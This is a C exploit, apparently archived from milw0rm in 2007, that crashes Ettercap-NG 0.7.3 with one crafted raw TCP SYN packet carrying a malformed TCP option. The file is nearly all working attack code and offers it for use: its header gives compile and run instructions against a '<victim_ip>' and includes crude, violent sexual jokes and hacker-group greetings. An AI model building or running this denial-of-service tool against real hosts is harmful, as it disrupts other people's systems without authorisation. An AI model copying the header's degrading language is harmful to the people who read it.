/*
     WARNING WARNING WARNING

     THIS PACKAGE CONTAINS AN 0DAY.
     NO ONE CAN BE HELD RESPONSIBLE IF THIS CODE RAPES YOUR SISTER OR MOLESTS YOUR DOG.
    
     WARNING WARNING WARNING


     THE ONE PACKET ETTERCAP KILLER NOW IN A SMALLER PACKAGE!
  
     If you want to know how this works then figure it out yourself.
     Tested with Ettercap-NG v 0.7.3 on FreeBSD 6.1 and Slackware 10.1

     greetz go out to tip, milkmang, chrak, jcb, rest of b4b0, mosthated, xtaylor, and rest of global hell,riot, JxT,
      p00kie_p0x, tadp0le, #oldskewl, #ubergeeks, #wp, le_kickban for fucking french women and anyone else I forgot..

     REMEBER KIDS EVILRABBI LOVES YOU :*.
 
    gcc -Wall -o b4b0-ettercap  b4b0-ettercap.c
    ./b4b0-ettercap <victim_ip>

*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>

#define IP              struct iphdr
#define TCP             struct tcphdr

void usage();
unsigned short ipChecksum(unsigned short *ptr, int nbytes);

void usage()
{
int i;
for (i=0; i < 100; i++) { printf("\n");}

 printf("               VVVVVVVVVVV                    VVVVVVVVVVV\n");
 printf("                VVVVV[ T34M B4B0 PROUDLY PRESENTS: ]VVVV\n");
 printf("                 VVVVVVVVVV                      VVVVVVV\n");
 printf("                  VVVVVVVVV   b4b0-ettercap.c   VVVVVVV\n");
 printf("       .    $&y    VVVVVVVVVV   ,p&   y&$  VVVVVVVVVV,a8888a,\n");
 printf("            $$'     VVVVVVVVVV,d$$$   $$' VVVVV .s$',8P\"'  `\"Y8,     . \n");
 printf("       yxxx.$$.xxxxxxxxxxxx ,d$\"`$$.x.$$.xxxxxxxx.,8P.xxxx.s`$$,.xxxg \n");
 printf("       $ P' $$,d$$Yba,    ,d$\" d $$   $$,d$$Yba,  88      ,$.$$$    $ \n");
 printf("       $ '  $$P'  ,`$$a ,d$\" ``\" $$ , $$$P' ,`Y$a 88     ,s$,$$$  . $ \n");
 printf("       $    $$k   g Y$$ $$$$$$$$$$$$$ $$f   d d$$ `8b   ,$$'d$$' ,d $ \n");
 printf("       bxxx.$$$, '`,d$\".xxxxxxxx.$$.x.$$b, ',a$$\".x`8ba,,aad$$'.xxxxd.  . \n");
 printf("            s$Y\"Y$bd$P',yas.VVVV s$$z  $Y\"Y$$$P\"'     \"Y$$$$(headflux)$ \n");
 printf("                         VVVVVVVV      VVVVVVVV \n");
 printf("                          VVVVVVVV    VVVVVVVV \n");
 printf("  ettercap-ng v0.7.3       VVVVVVVV  VVVVVVVV \n");
 printf("  Denial of Service         VVVVVVVVVVVVVVVV \n");
 printf("    by EvilRabbi             VVVVVVVVVVVVVV \n");
 printf(" <evilrabbi[@]gmail.com       VVVVVVVVVVVV \n");
 printf("                               VVVVVVVVVV \n");
 printf("                                VVVVVVVV \n");
 printf("./b4b0-ettercap  <victim ip>     VVVVVV \n");
 printf("                                  VVVV \n");
 printf("                                   VV \n");
}
unsigned short ipChecksum(unsigned short *ptr, int nbytes)
{
        register long sum;
        register u_short answer;
        u_short oddbyte;

        sum = 0;

        while (nbytes > 1) {
                sum += *ptr++;
                nbytes -= 2;
        }

        if (nbytes == 1) {
                oddbyte = 0;
                *((u_char *) & oddbyte) = *(u_char *) ptr;
                sum += oddbyte;
        }

        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;
return (answer);
}

int main(int argc, char **argv)
{
    int sockfd, opt = 1;
    char tcpoptions[4];
    char dest[20];
    unsigned int pLen,sIPLen;
    unsigned char pkt[(pLen = sizeof(IP) + sizeof(TCP) + 4)];
    unsigned char ip[(sIPLen = 12 + sizeof(TCP) + 4)];
    struct hostent *he;
    struct sockaddr_in host;
    struct sockaddr_in s;

    struct in_addr etter;
    IP *iphdr = (IP *)pkt;
    TCP *tcphdr = (TCP *)((unsigned char *)pkt + sizeof(IP));   

    if (getuid() != 0) {
    printf("you need to be r00t =(\n");
    exit(0);
    }

    if (argc != 2) {
    usage();
    exit(0);
    }
    if ((he=gethostbyname(argv[1])) == NULL) {  // get the host info
        herror("gethostbyname");
        exit(1);
    }
    snprintf (dest,sizeof(dest)-1,"%d.%d.%d.%d\n", (unsigned char)he->h_addr_list[0][0],
                             (unsigned char)he->h_addr_list[0][1],
                                                     (unsigned char)he->h_addr_list[0][2],
                                                     (unsigned char)he->h_addr_list[0][3]);

    if ((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_TCP)) == -1) {
        perror("socket");
        exit(1);
    }
    setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&opt,sizeof(opt));

     etter.s_addr = inet_addr(dest);
    s.sin_addr.s_addr = INADDR_ANY;
    //etter.s_addr = inet_addr("69.46.19.77");
    memset(tcpoptions,0,sizeof(tcpoptions));
    tcpoptions[0]=0x08;
    tcpoptions[1]=0x00;
    tcpoptions[2]=0x00;
    tcpoptions[3]=0x00;
 
    memset(&host, 0, sizeof(host));
    memset(pkt, 0, pLen);
    memcpy(pkt+sizeof(IP)+sizeof(TCP), tcpoptions, sizeof(tcpoptions));
    memset(ip, 0, sIPLen);
    *((unsigned long *)((unsigned char *)ip+0)) = s.sin_addr.s_addr;
    *((unsigned long *)((unsigned char *)ip+4)) = etter.s_addr;
    *((unsigned char *)((unsigned char *)ip+8)) = 0;
    *((unsigned char *)((unsigned char *)ip+9)) = IPPROTO_TCP;
    *((unsigned short *)((unsigned char *)ip+10)) = htons(pLen - sizeof(IP));
    iphdr->version       = 4;
    iphdr->ihl      = 5;
    iphdr->id      = rand() & 0xFFFF;
    iphdr->id = iphdr->id + 1;
    iphdr->saddr = s.sin_addr.s_addr;
    iphdr->daddr = etter.s_addr;
    iphdr->protocol       = IPPROTO_TCP;       
    iphdr->ttl     = 255;
    iphdr->tot_len     = pLen;
    iphdr->check     = ipChecksum((u_short *)iphdr, sizeof(IP));

    host.sin_family       = AF_INET;
    host.sin_addr.s_addr = etter.s_addr;

    tcphdr->source = htons(8);
    tcphdr->dest = htons(1);
    tcphdr->seq   = htonl(rand());
    tcphdr->ack_seq   = htonl(rand());
    tcphdr->doff   = ((sizeof(TCP)+4) / 4);
    tcphdr->check=0;
    tcphdr->fin     = 0;
    tcphdr->syn     = 1;
    tcphdr->rst     = 0;
    tcphdr->psh     = 0;
    tcphdr->ack     = 0;
    tcphdr->urg     = 0;
    tcphdr->window   = htons(5840);
    memcpy(ip+12, ((unsigned char *)pkt)+sizeof(IP), pLen - sizeof(IP));
    tcphdr->check = ipChecksum((u_short *)&ip, sIPLen);
 
   sendto(sockfd, pkt, pLen, 0, (struct sockaddr *)&host, sizeof(host));

   return 0;
}

// milw0rm.com [2007-04-13]
